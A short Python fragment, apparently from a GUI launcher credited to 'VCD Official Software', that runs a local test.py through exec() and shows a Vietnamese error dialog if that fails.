    ##    GUI APPLICATION BY VCD OFFICIAL SOFTWARE

    exec(open("test.py", mode='r', encoding="utf-8-sig").read())

except Exception as e:
    print(e)
    messagebox.showerror("Lỗi", "Có lỗi khi chạy chương trình")
    exit()
